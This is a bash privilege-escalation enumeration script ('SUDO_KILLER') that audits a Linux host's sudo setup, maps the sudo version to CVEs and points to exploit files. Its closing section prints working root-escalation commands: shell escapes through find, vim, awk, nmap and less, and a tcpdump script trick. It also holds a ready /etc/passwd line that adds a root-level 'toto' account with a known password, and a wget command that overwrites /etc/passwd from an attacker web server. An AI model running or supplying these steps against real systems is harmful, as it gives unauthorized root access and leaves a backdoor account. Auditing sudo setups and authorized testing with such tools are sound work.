#!/bin/bash
# This script was to developed to check for common misconfigurations and vulnerabilities of the sudo 
# Version="version 1.3"
# Date Created : 08/12/2018
# Date of last modification : 06/08/2019
# @TH3_ACE - BLAIS David

# Future updates :
# 
#
#

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal


##### help function
usage () 
{
#####  echo -e " $version \n"
printf " $version \n"
echo -e " Example: ./sudo_killer.sh -c -r report.txt -e /tmp/  \n"

		echo "OPTIONS:"
		echo "-k	Enter keyword"
		echo "-e	Enter export location"
		echo "-s 	Supply user password for sudo checks (NOT SECURE)"
#		echo "-t	Include thorough (lengthy) tests"
	        echo "-c	Include sudo CVE"
		echo "-r	Enter report name" 
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"
		
echo -e " ######################################################### "
}


header() 
{


cat << "EOF"
   _____ _    _ _____   ____    _  _______ _      _      ______ _____
  / ____| |  | |  __ \ / __ \  | |/ /_   _| |    | |    |  ____|  __ \
 | (___ | |  | | |  | | |  | | | ' /  | | | |    | |    | |__  | |__) |
  \___ \| |  | | |  | | |  | | |  <   | | | |    | |    |  __| |  _  /
  ____) | |__| | |__| | |__| | | . \ _| |_| |____| |____| |____| | \ \
 |_____/ \____/|_____/ \____/  |_|\_\_____|______|______|______|_|  \_\


EOF



# CANARY
}

function versionToInt() {
  local IFS=.
  parts=($1)
  let val=1000000*parts[0]+1000*parts[1]+parts[2]
  cnver=$val
}




intro()
{

#echo "${BOLD}${YELLOW}[+] Intro ${RESET}" 

who=`whoami` 2>/dev/null 
echo -e "${BLUE} @TH3_ACE - BLAIS David"
echo -e "${BLUE} Contribute and collaborate to the KILLER project @ https://github.com/TH3xACE"
echo -e "\n" 
echo -e "${BOLD}${GREEN}[+] Intro ${RESET}" 
echo -e "${BOLD}${YELLOW}Scan started at:${RESET}"; date 
echo -e "\n"
echo -e "Current user: $who"
echo -e "\n" 


if [ "$report" ]; then 
	echo -e "${BOLD}${YELLOW}[+] Report name: ${RESET} $report " 
else 
	:
fi

if [ "$export" ]; then 
	echo -e "${BOLD}${YELLOW}[+] Export location: ${RESET} $export" 
else 
	:
fi

echo -e "\n" 

# PHASE 2
#if [ "$thorough" ]; then 
#	echo "[+] Thorough tests = Enabled" 
#else 
#	echo -e "[+] Thorough tests = Disabled" 
#fi

sleep 2

if [ "$export" ]; then
  mkdir $export 2>/dev/null
  format=$export/sudo_killer-export-`date +"%d-%m-%y"`
  mkdir $format 2>/dev/null
else 
  :
fi

if [ "$sudopass" ]; then 
  echo -e "${RED} [+] Please enter password - NOT RECOMMENDED - For CTF use! ${RESET}"
  read -s userpassword
  echo 
else 
  :
fi



}



footer()
{
echo -e "\n ${GREEN} [*##################### SCAN_COMPLETED ##########################*] ${RESET} "
}



checkinitial()
{

echo -e "${BOLD}${YELLOW}============ Initial check - Quick ================== ${RESET} \n"

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='nmap\|perl\|awk\|find\|bash\|sh\|man\|more\|less\|vi\|emacs\|vim\|nc\|netcat\|python\|ruby\|lua\|irb\|tar\|zip\|gdb\|pico\|scp\|git\|rvim\|script\|ash\|csh\|curl\|dash\|ed\|env\|expect\|ftp\|sftp\|node\|php\|rpm\|rpmquery\|socat\|strace\|taskset\|tclsh\|telnet\|tftp\|wget\|wish\|zsh\|ssh'


##### sudo version - check to see if there are any known vulnerabilities with this - CVE
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo version:${RESET}\n$sudover " 
  echo -e "\n"
else 
  :
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudoers configuration (condensed) exported:${RESET}\n$sudoers"
  echo -e "\n" 

#export sudoers file to export location
if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/ 2>/dev/null
  #cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
  cp /etc/sudoers $format/sudoers_export 2>/dev/null
else 
  :
fi

else 

if [ "$export" ] ; then
#sudoers=`echo '' | sudo -S -l -k 2>/dev/null` >> $format/sudoers_export.txt 2>/dev/null
sudoers="sudo -S -l -k"
$sudoers > $format/sudoers_export.txt
echo -e "${BOLD}${GREEN}[+] Sudoers configuration exported!${RESET} \n$sudoers"
echo -e "\n" 
fi

fi


#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "${BOLD}${GREEN}[+] SUDO possible without a password!${RESET}\n$sudoperms" 
  echo -e "\n" 
else 
  :
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "${BOLD}${GREEN}[+] SUDO possible with a password supplied!${RESET}\n$sudoauth" 
        echo -e "\n" 
      else 
        :
      fi
    fi
else
  :
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      if [ "$sudopermscheck" ]; then
        echo -e "${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\n$sudopermscheck" 
        echo -e "\n" 
     else 
        :
      fi
    fi
else
  :
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\n$sudopwnage" 
  echo -e "\n" 
else 
  :
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "[-] Accounts that have recently used sudo:\n$whohasbeensudo" 
  echo -e "\n"
else
  :
fi

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "[-] SELinux seems to be present: $sestatus, can execute /exploits/CVE-2017-1000367-2.c if vulnerable (Check CVEs)."
  echo -e "\n"
fi

}


checkcve() 
{

  if [ "$sudocve" ]; then
  echo -e "${BOLD}${YELLOW}============ Checking for disclosed vulnerabilities related to version used (CVE) ================== ${RESET} \n"

  echo -e "${BOLD}${GREEN}[+] Sudo version vulnerable to the following CVEs:${RESET}"
  sver_tmp=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null | cut -d" " -f 3 2>/dev/null`
  sver=$(echo $sver_tmp | tr -d ' ' | sed 's/P/p/g')
  cat cve.sudo2.txt | grep "$sver_tmp" | cut -d"+" -f 1,2 | awk '{print $0,"\n"}'
  #echo -e "\n"
  
  cve_vuln=`cat cve.sudo2.txt | grep "$(echo $sver)" | cut -d"+" -f 1`
  
  while read -r line; do
	#echo "$line"
	cvepath=`ls -al exploits/ | grep "$line" | cut -d " " -f 11`
	if [ "$cvepath" ]; then
  		echo -e "\n[+] Please find the following exploit for $line in the exploits' directory:"
  		echo -e "[*] Exploit /exploits/$cvepath \n"
	fi
   done <<< "$cve_vuln"

#cat cve.sudo.txt | while read line
  #do
  #echo $line
  #done
  
  else 
  :
  fi

}


checkmisconfig()
{

echo -e "${BOLD}${YELLOW}============ Checking for Common Misconfiguration ================== ${RESET} \n"

sudochownrec=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown -hR"`
if [ "$sudochownrec" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo chown with recursive, was found: ${RESET}\n $sudochownrec"
  echo -e "[-] You can change the owner of directories, refer to /notes/chown-hR.txt \n"
  # echo -e "[-] run the command: sudo chown -hR [new_owner:old_owner] [/parent/children] "
  # echo -e "[-] you can then modify or create .sh script that can be run with root right "
  # echo -e "[-] Refer to Possible sudo pwnag! from above "
  # echo -e "[-] #! /bin/bash "
  # echo -e "[-] bash "	
  # echo -e "[-] sudo ./[appp].sh \n"
else
  :
fi

sudochown=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown"`
if [ "$sudochown" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo chown, was found: ${RESET}\n $sudochown"
  echo -e "[-] You can change the owner of directories, refer to /notes/chown-hR.txt \n "
else
  :
fi

sudoimpuser=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/su"`
if [ "$sudoimpuser" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo su, was found: ${RESET} \n $sudoimpuser"
  echo -e "[-] You can impersonate users, by running the cmd: sudo su - [USER] "
  echo -e "[+] Run the tool AGAIN for the impersonated user! \n"
else
  :
fi

#sudonopassuser==`echo '' | sudo -S -l -k 2>/dev/null | grep "NOPASSWD:" | cut -d " " -f 5`
sudonopassuser==`echo '' | sudo -S -l -k 2>/dev/null | grep "NOPASSWD:" | grep "/bin\|/sbin"`
if [ "$sudonopassuser" ]; then
echo -e "${BOLD}${GREEN}[+] Sudo without password for other user, was found: ${RESET} \n $sudoimpuser"
echo -e "[-] You can impersonate users, by running the cmd: sudo -u [USER] /path/bin"
else
  :
fi

##### CVE-2015-5602
##### The bug was found in sudoedit, which does not check the full path if a wildcard is used twice (e.g. /home/*/*/esc.txt), 
#####  this allows a malicious user to replace the esc.txt real file with a symbolic link to a different location (e.g. /etc/shadow).

sudodblwildcard=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD: sudoedit" | grep "/*/*/"`
if [ "$sudodblwildcard" ]; then
  echo -e "\n"
  echo -e "${BOLD}${GREEN}[+] Sudoedit with double wildcard was found was detected: ${RESET} \n $sudodblwildcard"
  echo -e "[-] Vulnerable to CVE-2015-5602 if the sudo version is <=1.8.14, check the version of sudo"  
  echo -e "[*] Exploit: /exploits/CVE-2015-5602.sh"  
  echo -e "\n" 
#  echo -e "[-] run the command: sudo ./CVE-2015-5602.sh then su [RANDOM PASSWORD GENERATED]\n"  
else
  :
fi

# grep '*/\|/*\|*'  or | grep '*/"\|"/*"\|"*''
sudowildcard=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep '*/\|/*\|*' `  
if [ "$sudowildcard" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard was found in the suoders file: ${RESET} \n $sudowildcard \n"
else
  :
fi

sudowildcardsh=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep ".sh"`
if [ "$sudowildcardsh" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard with a bash was found in the suoders file: ${RESET} \n $sudowildcardsh"
else
  :
fi

echo -e "${BOLD}${YELLOW}============ Checking for File owner hijacking ================== ${RESET} \n"

#####  Chown file reference trick (file owner hijacking)
sudowildcardchown=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "chown"`
if [ "$sudowildcardchown" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard with chown was found in the suoders file: ${RESET} \n $sudowildcardchown"
  echo -e "[-] File owner hijacking possible."
  echo -e "[*] Exploit: /notes/file_owner_hijacking (chown).txt \n"
else
  :
fi

#####  tar file reference trick (file owner hijacking)
sudowildcardtar=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "tar"`
if [ "$sudowildcardtar" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard with tar was found in the suoders file: ${RESET} \n $sudowildcardtar"
  echo -e "[-] File owner hijacking possible."
  echo -e "[*] Exploit: /notes/file_owner_hijacking (tar).txt \n"
else
  :
fi

#####  rsync file reference trick (file owner hijacking)
sudowildcardrsync=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "rsync"`
if [ "$sudowildcardtar" ]; then
  echo -e "${BOLD}${GREEN} [+] Wildcard with rsync was found in the suoders file:  ${RESET} \n $sudowildcardrsync"
  echo -e "[-] File owner hijacking possible."
  echo -e "[*] Exploit: /notes/file_owner_hijacking (rsync).txt \n"
else
  :
fi

echo -e "${BOLD}${YELLOW}============ Checking for File permission hijacking ================== ${RESET} \n"

#####  Chmod file reference trick(file permission hijacking)
sudowildcardchmod=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "chmod"`
if [ "$sudowildcardchmod" ]; then
  echo -e "${BOLD}${GREEN} [+] Wildcard with chmod was found in the suoders file: ${RESET} \n $sudowildcardchmod"
  echo -e "[-] File permission hijacking possible."
  echo -e "[*] Exploit: /notes/file_permission_hijacking.txt \n"
else
  :
fi


#### check for scripts execution without password in sudoers

echo -e "${BOLD}${YELLOW}============ Checking for Missing scripts from sudoers ================== ${RESET} \n"
current_user="$(whoami)"

groups > /tmp/groups.txt

sudo -S -l -k | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh  > /tmp/script_list


echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: /tmp/script_list  ${RESET}"

#### Check for missing scripts that exists in the sudoers file and whether the current user is the owner of directory 
echo -e "[+] Checking whether there are any missing scripts defined in sudoers but that no longer exists on system:"

#echo -e "\n --------------------------------------------------------------"
cat /tmp/script_list | while read line
do

#test
#echo $line

# missing file/script
if [ ! -f $line ]; then

rep=$( echo "$line" | awk -F.sh '{print $1}' | rev | cut -d "/" -f 2,3,4,5,6,7 | rev | cut -d " " -f 2 )


echo -e "\n"
echo -e "------------------------------------------------------------------"
echo -e "[++] Missing script found:"
echo $line
echo -e "\n"

echo -e ">>> Checking Directory User Ownership of the missing script"

#### checking whether the current user is the owner of the directory and his rights
repexist=`echo '' | ls -ld $rep`
direc_user=$( echo "$repexist" | cut -d " " -f 3 )

# r- ls on directory / w- create file / x- access the directory
drights=$( echo "$repexist" | cut -d " " -f 1 )

# checking the owner of the directory is the current user
if [ "$current_user" == "$direc_user" ]
then
echo -e "${BOLD}${GREEN}[+] The current user is the directory owner of the missing file.${RESET}"

#### checking the permission on the directory that the owner/current user has

drightsr=${drights:1:1}
drightsw=${drights:2:1}
drightsx=${drights:3:1}

# echo $drightsr
# echo $drightsw
# echo $drightsx

msgright1="The current user has the right to: "

if [ "$drightsr" == "r" ]
then
msgright1+=" list since r (ls)"
fi

if [ "$drightsw" == "w" ]
then
msgright1+=", access w (cd) "
fi

if [ "$drightsx" == "x" ]
then
msgright1+=" and x create/move file/directory"
fi

#msgright1+=$line

echo -e "[-] $msgright1"
echo -e "[*] Exploit, refer to /notes/owner_direc_missing_file.txt and /notes/Excessive_directory_rights.txt \n"

else
  echo -e "[-] The user $direc_user is the directory owner of the missing file. \n"
fi  # current user

echo -e ">>> Checking Directory Group Ownership of the missing scripts"
# checking whether the current user is part of the group owner of the directory 
direc_grp=$( echo "$repexist" | cut -d " " -f 4 )

cat /tmp/groups.txt | while read line1
do
if [ "$line1" == "$direc_grp" ]
then

echo -e "${BOLD}${GREEN}[+] The current user is in a group that is the directory owner of the missing file.${RESET}"

dgrightsr=${drights:4:1}
dgrightsw=${drights:5:1}
dgrightsx=${drights:6:1}

msgright="The current user is in a group which can "

if [ "$dgrightsr" == "r" ]
then
msgright+="list since r (ls)"
fi

if [ "$dgrightsw" == "w" ]
then
msgright+=", access w (cd) "
fi

if [ "$dgrightsx" == "x" ]
then
msgright+=" and x create/move file/directory. \n"
fi

#msgright+=$line

echo -e "[-] $msgright"
echo -e "[*] Exploit, refer to /notes/owner_direc_missing_file.txt "
#echo -e "-------------------------------------------------------"
break
fi  
done


fi  # check file missing

done  

echo -e "\n"


echo -e "${BOLD}${YELLOW}============ Checking for Excessive directory right where the scripts from sudoers reside ================== ${RESET} \n"

echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: /tmp/script_list.txt ${RESET}"

echo -e "-------------------------------------------------------"

cat /tmp/script_list | while read liney
do


####### [DIRECTORY]

# checking the directory rights of the scripts identified in sudo
if [ -f $liney ]; then
rep1=$( echo "$liney" | awk -F.sh '{print $1}' | rev | cut -d "/" -f 2,3,4,5,6,7 | rev | cut -d " " -f 2 )

echo -e "\n"
echo "[++] Checking the directory rights for the script:"
echo "$liney"
echo -e "\n"

echo -e ">>> Checking Directory User Ownership of the scripts"

#### checking whether the current user is the owner of the directory and his rights
repexist1=`echo '' | ls -ld $rep1`
direc_user1=$( echo "$repexist1" | cut -d " " -f 3 )

# r- ls on directory / w- create file / x- access the directory
drights1=$( echo "$repexist1" | cut -d " " -f 1 )

# checking the owner of the directory is the current user
if [ "$current_user" == "$direc_user1" ]
then
  echo -e "${BOLD}${GREEN}[+] The current user is the directory owner of the script.${RESET}"

#### checking the permission on the directory that the owner/current user has

drightsr1=${drights1:1:1}
drightsw1=${drights1:2:1}
drightsx1=${drights1:3:1}

msgright2="The current user has the right to: "

if [ "$drightsr1" == "r" ]
then
msgright2+=" list since r (ls)"
fi

if [ "$drightsw1" == "w" ]
then
msgright2+=", access w (cd) "
fi

if [ "$drightsx1" == "x" ]
then
msgright2+="and x create/move file/directory "
fi
#msgright2+="for the script : \n"
#msgright2+=$liney

echo -e "[-] $msgright2"
echo -e "[*] Exploit, refer to /notes/Excessive_directory_rights.txt \n"

else
  echo -e "[-] The user $direc_user1 is the directory owner of the missing file. \n"
fi  # current user


echo -e ">>> Checking Directory Group Ownership of the scripts"
# checking whether the current user is part of the group owner of the directory 
direc_grp1=$( echo "$repexist1" | cut -d " " -f 4 )

cat /tmp/groups.txt | while read linet
do
if [ "$linet" == "$direc_grp1" ]
then

echo -e "${BOLD}${GREEN}[+] The current user is in a group that is the directory owner of the script.${RESET}"

dgrightsr1=${drights1:4:1}
dgrightsw1=${drights1:5:1}
dgrightsx1=${drights1:6:1}

msgright3="The current user is in a group which can "

if [ "$dgrightsr1" == "r" ]
then
msgright3+="list since r (ls)"
fi

if [ "$dgrightsw1" == "w" ]
then
msgright3+=", access w (cd) "
fi

if [ "$dgrightsx1" == "x" ]
then
msgright3+=" and x create/move file/directory. "
fi

#msgright3+=$liney

echo -e "[-] $msgright3"
echo -e "[*] Exploit, refer to /notes/Excessive_directory_rights.txt \n"
break
fi  
done

echo -e " \n ------------------------------------------------"

fi


done


# clear the scripts list
# rm /tmp/sh_list.txt

echo -e "${BOLD}${YELLOW}============ Checking for Writable scripts from sudoers ================== ${RESET} \n"

####### [FILE]

##### Check for writable scripts by current users from the sudoers file 

#current_user="$(whoami)"
#current_groups="$(groups)"

#groups > /tmp/groups.txt

#sudo -S -l -k | grep .sh | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g' |  tr -d " \t\r" | grep ".sh" > /tmp/sh_list.txt



cat /tmp/script_list | while read linex
do

# if script exist
if [[ -f ${linex} ]]; then

# owner of each file/script
owner_file=`echo '' | ls -l $linex | cut -d " " -f 3 2>/dev/null` 

shperms=$( ls -l "$linex" )

if [ "$current_user" == "$owner_file" ]
then

echo -e ">>> Checking current user permission on the scripts owned by him \n"
echo -e "Checking the following script: $linex"
#echo -e "\n"

msgfp="The current user can "

#shperms=$( ls -l "$linex" )
#perm_user=$( echo "$shperms" | cut -d "-" -f 2 )

frightsr=${shperms:1:1}
frightsw=${shperms:2:1}
frightsx=${shperms:3:1}

if [[ $frightsr = "r" ]]
then
  msgfp+="read the file (r), "

fi # perms

if [[ $frightsw = "w" ]]
then
  msgfp+="modify the file (w), "

fi # perms

if [[ $frightsx = "x" ]]
then
  msgfp+="and can execute the file (x)"

fi # perms

 msgfp+=" for the script $linex"

echo -e "${BOLD}${GREEN}[+] $msgfp${RESET} \n"

# clear var
owner_file="nothing"

fi # user owner check 

#############################################################

# checking whether the current user is part of the group owner of the directory 
direc_grp1=$( echo "$shperms" | cut -d " " -f 4 )

#echo $shperms
#echo $direc_grp1


cat /tmp/groups.txt | while read line2
do
if [ "$line2" == "$direc_grp1" ]
then
echo -e ">>> Checking current user group ownership of the script \n"
#echo -e ">>> Checking current user group permission on file \n"
echo -e "${BOLD}${GREEN}[-] The current user is part of a group or several groups that is the owner of the script, the groups are: $line2${RESET}"
#echo -e "[-] The current user is in a group that is the file owner of the script."
# echo -e "[+] Exploit, refer to /notes/owner_direc_missing_file.txt "

# drightsgrp=${drights:5:3}

fgrightsr=${shperms:4:1}
fgrightsw=${shperms:5:1}
fgrightsx=${shperms:6:1}


msgfgright="The current user can "

if [ "$fgrightsr" == "r" ]
then
msgfgright+="read the file (r), "
fi

if [ "$fgrightsw" == "w" ]
then
msgfgright+="modify the file (w), "
fi

if [ "$fgrightsx" == "x" ]
then
msgfgright+="and can execute the file (x). "
fi

msgfgright+=$linex

direc_grp1="nothing"

#if [[ $drightsgrp = "rwx" ]]
#  then
#    echo -e "[-] $drightsgrp > The current user is in a group which can list if r (ls), access w (cd) and x create/move file/directory in the directory $line."
echo -e "[+] $msgfgright"
echo -e "[*] Exploit, refer to /notes/owner_direc_missing_file.txt \n"
#fi # permission
# break
fi  # group owner check
done

fi # exists

done 


echo -e "${BOLD}${YELLOW}============ Checking whether vulnerable to Credential Harvesting ================== ${RESET} \n"
echo "Current User: $current_user"
current_user="$(whoami)"
#echo $current_user

#hdir=`echo "" | ls -ld /home/*`
#echo "$hdir"
hdir=`echo "" | ls -al /home/*/.bashrc`
#echo "$hdir"

while read -r line; do

current=$line
wo=${current:2:1}
wg=${current:5:1}
wa=${current:8:1}

dir_user=$( echo "$current" | cut -d " " -f 3 )
#echo $dir_user

if [ "$current_user" == "$dir_user" ]
then
#echo $wo
#echo $wa

if [ "$wo" == "w" ]
then
# echo "Current user is the owner and can write the bashrc file"     
echo -e "${BOLD}${GREEN}[+] Vulnerable to Creds Harvesting. ${RESET}"
echo "[*] Exploit, refer to the exploit /exploits/credHarvest.sh"
fi

if [ "$wa" == "w" ]
then
# echo "Current user can write the bashrc file"
echo -e "${BOLD}${GREEN}[+] Vulnerable to Creds Harvesting. ${RESET}"
echo "[*] Exploit, refer to the exploit /exploits/credHarvest.sh"
fi

# echo $line
fi # check owner
done <<< "$hdir"


#rm /tmp/sh_list1.txt

}


checkdangenvar()
{


##### Check for dangerous environment variables
echo -e "${BOLD}${YELLOW}============ Checking for Dangerous environment variables ================== ${RESET} \n"


# check for env_reset being disabled 
sudoenv=`echo '' | sudo -S -l -k 2>/dev/null | grep "\!env\_reset" `  
if [ "$sudoenv" ]; then

sudover1=`echo "$sudover" | sed 's/Sudo version //g'`

if [ "$sudover1" ]; then
versionToInt $sudover1

if [ "$cnver" -lt "1008025" ] ; then
#if [ "$cnver" -lt "1008005" ] || [ "$cnver" -gt "1006009" ] ; then
echo -e "${BOLD}${GREEN}[+] env_reset being disabled, This means we can manipulate the environment of the command we are allowed to run (depending on sudo version).${RESET}"
echo -e "${BOLD}${GREEN}[+] Since the sudo version is > 1.6.9 and < 1.8.5, the environment variables are not removed and it is probably vulnerable to the CVE-2014-0106 ${RESET}" 
echo -e "[-] Exploit for the CVE:  /exploits/CVE-2014-0106.txt \n"

fi

else 
  :
fi

else
  :
fi


# check for LD_PRELOAD

sudoenvld_preload=`echo '' | sudo -S -l -k 2>/dev/null | grep "LD_PRELOAD" `  
if [ "$sudoenvld_preload" ]; then
echo -e "${BOLD}${GREEN}[+] LD_PRELOAD is set and is a dangerous environment variable.${RESET}"
echo -e "[-] Notes on the exploitation of LD_PRELOAD : /notes/env_exploit.txt"
echo -e "[-] Exploit :" 
echo -e "     Step 1: Copy the library /exploits/Env_exploit.so to tmp directory."
echo -e "     Step 2: sudo LD_PRELOAD=/tmp/Env_exploit.so [a bin that can be executed with sudo such as cp/find] \n"

else
  :
fi


echo -e "${BOLD}${GREEN}[+] Checking for dangerous environment variables such as PS4, PERL5OPT, PYTHONINSPECT,... .${RESET}"

#>> use /exploits/Dangerous_env_var.txt

cat exploits/Dangerous_env_var.txt | while read linen1
do
sudoenvvar=`echo '' | sudo -S -l -k 2>/dev/null | grep "$linen1" `
if [ "$sudoenvvar" ]; then
echo "The dangerous environment variable $linen1 is set within sudo and is potentially vulnerable."
else
  :
fi


done

echo -e "\n"



}




checkdangbin()
{

#####  Check for dangerous bin

function fn_dngbin ()
{

var1=""


var1=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "$2$1"`
if [ "$var1" ]; then
  echo -e "[+] Sudo $1, was found "
  echo -e "Run the following commands :"

  if [ -z "$3" ]
  then
   :
  else
  echo "$3"
  fi

  if [ -z "$4" ]
  then
   :
  else
  echo "$4"
  fi

  if [ -z "$5" ]
  then
   :
  else
  echo "$5"
  fi

  if [ -z "$6" ]
  then
   :
  else
  echo "$6"
  fi

  if [ -z "$7" ]
  then
   :
  else
  echo "$7"
  fi

echo -e "\n"
else
  :
fi
}


function fn_dngbin2 ()
{

var2=""


var2=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "bin/$1"`
if [ "$var2" ]; then
  echo -e "[+] Sudo $1, was found "
  echo -e "Run the following commands :"
  
  resgrep=`echo '' | cat exploits/"$1".txt | grep -v "\* Sudo \*"`
  echo -e "$resgrep"
  
echo -e "\n"
else
  :
fi
}


# echo -e "\n" 
echo -e "${BOLD}${YELLOW}============ Checking for Dangerous bin from sudoers ================== ${RESET} \n"


# fn_dngbin "BIN_NAME" "PATH" "CMD_LINE_1" "CMD_LINE_2" "CMD_LINE_3" "CMD_LINE_4"
echo -e "${BOLD}${GREEN}[+] Common dangerous bins: ${RESET}"
fn_dngbin "find" "/usr/bin/" "[=] sudo find /etc/passwd -exec /bin/sh \;"
fn_dngbin "nano" "/usr/bin/" "[=] if find exists, then sudo find /bin -name nano -exec /bin/sh \;"
fn_dngbin "nano" "/usr/bin/" "[=] A text editor with root priv can be used to modify the passwd file so as " "to add a user with root priv. add the below line into the /etc/passwd file using >> sudo nano /etc/passwd" "toto:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash" "su - toto , username: toto password: test"
fn_dngbin "vim" "/usr/bin/" "[=] sudo vim -c '!sh'"
fn_dngbin "vim" "/usr/bin/" "[=] A text editor with root priv can be used to modify the passwd file so as " "to add a user with root priv. add the below line into the /etc/passwd file using >> sudo vim /etc/passwd" "toto:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash" "su - toto , username: toto password: test"
fn_dngbin "nmap" "/usr/bin/" "[=] Old way, sudo nmap --interactive" "then !sh" "[+] New way, echo 'os.execute('/bin/sh') > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse'"
fn_dngbin "man" "/usr/bin/" "[=] sudo man man" "[+] !sh"
fn_dngbin "less" "/usr/bin/" "[=] sudo less /etc/hosts" "then !sh" " can also be used to read a file > sudo less :e /etc/passwd or sudo less :n /var/log/dmesg /etc/shadow" "check /web res/Dangerous Sudoers Entries – PART 2/4: Insecure Functionality – Compass Security Blog.html"
fn_dngbin "more" "/usr/bin/" "[=] sudo more /etc/hosts" "then !sh"
fn_dngbin "awk" "/usr/bin/" "[=] sudo awk 'BEGIN {system('""/bin/sh""')}'" 
fn_dngbin "vi" "/usr/bin/" "[=] A text editor with root priv can be used to modify the passwd file so as " "to add a user with root priv. add the below line into the /etc/passwd file using >> sudo vi /etc/passwd" "toto:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash" "su - toto , username: toto password: test"
fn_dngbin "wget" "/usr/bin/" "[=] Copy the /etc/passwd file of the target then transfert by an means to the attack box" "Modify the /etc/passwd file stolen to add the line below: " "toto:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash" "username: toto password: test, Launch a web server and transferred the modified /etc/passwd file, sudo wget http://[IP]:8585/passwd -O /etc/passwd then su - toto "
fn_dngbin "tcpdump" "/usr/sbin/" "[=] create a script in /tmp/script.sh" "#! /bin/bash" "bash" "Run the command: sudo -u [USER] /usr/sbin/tcpdump -ln -i ens32 -w /dev/null -W 1 -G 1 -z /tmp/script.sh" 
fn_dngbin "bash" "/usr/bin/" "[=] run sudo -u [user] /bin/bash" 

# GTFOBINS - https://gtfobins.github.io/#+sudo
#fn_dngbin "apt-get" "/usr/bin/" "[=] sudo apt-get changelog apt" "!/bin/sh"
#fn_dngbin "apt" "/usr/bin/" "[=] sudo apt-get changelog apt" "!/bin/sh"    
#fn_dngbin "aria2c" "/usr/bin/" "[=] COMMAND='id'" "TF=$(mktemp)" "echo "$COMMAND" > $TF" "chmod +x $TF" "sudo aria2c --on-download-error=$TF http://x"   
